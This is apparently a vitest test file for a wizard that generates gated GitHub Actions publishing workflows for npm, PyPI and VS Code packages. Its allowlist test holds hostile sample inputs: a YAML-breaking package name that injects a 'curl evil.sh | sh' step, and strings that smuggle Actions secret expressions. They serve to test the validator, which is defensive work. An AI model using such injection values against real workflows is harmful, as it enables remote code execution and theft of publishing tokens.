import { describe, expect, test } from "vitest";
import {
  ECOSYSTEMS,
  gateSetupEcosystemOptions,
  getWorkflowGateAdapter,
} from "../../server/lib/ecosystems";
import {
  assertGateSetupEnvironment,
  assertGateSetupPackageName,
} from "../../server/lib/github-app/gate-setup";
import type { GateSetupTemplate } from "../../server/lib/workflow-gates/types";

/**
 * The setup wizard's generated workflows.
 *
 * These are the bytes a maintainer merges into their repository, so the shape
 * is pinned rather than eyeballed: the gate contract (record `SHA256SUMS`,
 * upload it with the artifacts, gate the publish job on the environment,
 * re-verify with `--check --strict`) has to survive any edit to the templates.
 */

const ENVIRONMENT = "release-gate";

function template(ecosystem: string, packageName: string): GateSetupTemplate {
  const adapter = getWorkflowGateAdapter(ecosystem);
  const build = adapter.gateSetupTemplate;
  if (!build) throw new Error(`${ecosystem} has no gateSetupTemplate`);
  return build({ environmentName: ENVIRONMENT, packageName });
}

const CASES = [
  { ecosystem: "npm", packageName: "@acme/toolkit", artifactName: "npm-release-candidates" },
  { ecosystem: "pypi", packageName: "acme-toolkit", artifactName: "pypi-release-candidate" },
  { ecosystem: "vscode", packageName: "acme.toolkit", artifactName: "vscode-release-candidate" },
] as const;

describe("gate setup templates", () => {
  test("every gate ecosystem ships a setup template", () => {
    const missing = ECOSYSTEMS.filter((eco) => eco.gate && !eco.gate.gateSetupTemplate).map(
      (eco) => eco.id,
    );
    expect(missing).toEqual([]);
  });

  test("exposes the wizard options from the ecosystem registry", () => {
    expect(gateSetupEcosystemOptions().map((option) => option.id)).toEqual(
      CASES.map((testCase) => testCase.ecosystem),
    );
  });

  for (const testCase of CASES) {
    describe(testCase.ecosystem, () => {
      const generated = template(testCase.ecosystem, testCase.packageName);

      test("writes under .github/workflows and names the ecosystem", () => {
        expect(generated.workflowPath).toMatch(/^\.github\/workflows\/drydock-.+\.yml$/);
        expect(generated.workflowPath).toContain(testCase.ecosystem);
      });

      test("interpolates the caller's package name and environment", () => {
        expect(generated.yaml).toContain(`name: "Publish ${testCase.packageName}"`);
        expect(generated.yaml).toContain(`environment: "${ENVIRONMENT}"`);
        // The environment must gate the *publish* job, not the build job.
        const publishIndex = generated.yaml.indexOf("  publish:");
        expect(publishIndex).toBeGreaterThan(-1);
        expect(generated.yaml.indexOf(`environment: "${ENVIRONMENT}"`)).toBeGreaterThan(
          publishIndex,
        );
      });

      test("records SHA256SUMS at build time and re-checks it before publishing", () => {
        expect(generated.yaml).toContain("sha256sum");
        expect(generated.yaml).toContain("> SHA256SUMS");
        expect(generated.yaml).toContain("sha256sum --check --strict SHA256SUMS");
        // The digest record has to be uploaded with the artifacts, or the
        // publish job has nothing to verify against.
        const recordIndex = generated.yaml.indexOf("> SHA256SUMS");
        const uploadIndex = generated.yaml.indexOf("actions/upload-artifact@v4");
        expect(recordIndex).toBeLessThan(uploadIndex);
      });

      test("uploads and downloads the artifact name the gate resolver looks for", () => {
        const adapter = getWorkflowGateAdapter(testCase.ecosystem);
        expect(adapter.artifactName).toBe(testCase.artifactName);
        const occurrences = generated.yaml.split(`name: ${testCase.artifactName}`).length - 1;
        expect(occurrences).toBe(2);
      });

      test("carries hardening notes that name the environment", () => {
        expect(generated.notes.length).toBeGreaterThan(0);
        expect(generated.notes.join("\n")).toContain(ENVIRONMENT);
      });

      test("never emits an unquoted interpolation the caller could control", () => {
        // The only `${{ }}` allowed is a literal Actions expression written by
        // the template itself, never one assembled from the package name.
        for (const match of generated.yaml.matchAll(/\$\{\{([^}]*)\}\}/g)) {
          expect(match[1]).not.toContain(testCase.packageName);
        }
      });
    });
  }

  test("npm pins the OIDC trusted-publishing shape", () => {
    const generated = template("npm", "@acme/toolkit");
    expect(generated.yaml).toContain("id-token: write");
    expect(generated.yaml).toContain("--provenance");
    // A token path must not exist anywhere in the file. `registry-url` writes an
    // .npmrc that expects NODE_AUTH_TOKEN, so it is as disqualifying as the
    // secret itself.
    expect(generated.yaml).not.toContain("NODE_AUTH_TOKEN");
    const keys = generated.yaml.split("\n").map((line) => line.trim());
    expect(keys.some((line) => line.startsWith("registry-url:"))).toBe(false);
    // npm's OIDC exchange needs npm >= 11.5.1; neither Node 22's bundled npm nor
    // the runner image ships it, so the publish job installs it explicitly.
    expect(generated.yaml).toContain("npm install -g npm@^11.5.1");
    const upgradeIndex = generated.yaml.indexOf("npm install -g npm@^11.5.1");
    const publishIndex = generated.yaml.indexOf("npm publish");
    expect(upgradeIndex).toBeGreaterThan(generated.yaml.indexOf("  publish:"));
    expect(upgradeIndex).toBeLessThan(publishIndex);
  });

  test.each([
    ["npm", "@acme/toolkit", "npm pack --pack-destination dist"],
    ["vscode", "acme.toolkit", "npx @vscode/vsce package --out dist/extension.vsix"],
  ])("%s creates dist before writing the release artifact", (ecosystem, packageName, command) => {
    const generated = template(ecosystem, packageName);
    const createIndex = generated.yaml.indexOf("mkdir -p dist");
    const packageIndex = generated.yaml.indexOf(command);
    expect(createIndex).toBeGreaterThan(-1);
    expect(createIndex).toBeLessThan(packageIndex);
  });

  test("pypi removes the checksum file before handing dist/ to the publisher", () => {
    const generated = template("pypi", "acme-toolkit");
    const removeIndex = generated.yaml.indexOf("rm dist/SHA256SUMS");
    const publishIndex = generated.yaml.indexOf("pypa/gh-action-pypi-publish");
    expect(removeIndex).toBeGreaterThan(-1);
    expect(removeIndex).toBeLessThan(publishIndex);
  });

  test("vscode reads its Marketplace PAT from the gated environment", () => {
    const generated = template("vscode", "acme.toolkit");
    expect(generated.yaml).toContain("VSCE_PAT: ${{ secrets.VSCE_PAT }}");
    expect(generated.yaml).toContain("--packagePath dist/extension.vsix");
  });
});

describe("gate setup identity allowlist", () => {
  test("accepts the identifiers each ecosystem actually uses", () => {
    for (const name of ["@acme/toolkit", "acme-toolkit", "acme.toolkit"]) {
      expect(() => assertGateSetupPackageName(name)).not.toThrow();
    }
    for (const environment of ["production", "release gate", "prod_1"]) {
      expect(() => assertGateSetupEnvironment(environment)).not.toThrow();
    }
  });

  test("rejects anything that could break out of a quoted YAML scalar", () => {
    for (const hostile of [
      'a"\nrun: curl evil.sh | sh',
      "a${{ secrets.NPM_TOKEN }}",
      "a\\b",
      "a`b`",
      "",
    ]) {
      expect(() => assertGateSetupPackageName(hostile)).toThrow();
    }
    for (const hostile of ['prod"', "prod\n", "prod${{ github.token }}", ""]) {
      expect(() => assertGateSetupEnvironment(hostile)).toThrow();
    }
  });

  test("caps length so a name the template step would reject never reaches GitHub", () => {
    expect(() => assertGateSetupEnvironment("e".repeat(128))).not.toThrow();
    expect(() => assertGateSetupEnvironment("e".repeat(129))).toThrow();
    expect(() => assertGateSetupPackageName("p".repeat(214))).not.toThrow();
    expect(() => assertGateSetupPackageName("p".repeat(215))).toThrow();
  });
});
